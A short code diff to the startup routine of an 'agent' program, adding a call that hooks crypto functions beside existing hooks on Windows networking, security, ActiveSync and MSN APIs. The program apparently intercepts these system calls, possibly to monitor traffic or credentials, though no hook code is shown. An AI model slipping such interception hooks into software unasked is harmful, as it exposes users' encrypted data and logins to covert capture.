@@ -77,6 +77,7 @@ BOOL CAgentApp::InitInstance()
 
   hook_winsock();
   hook_secur32();
+  hook_crypt();
   //hook_httpapi();
   hook_activesync();
   hook_msn();
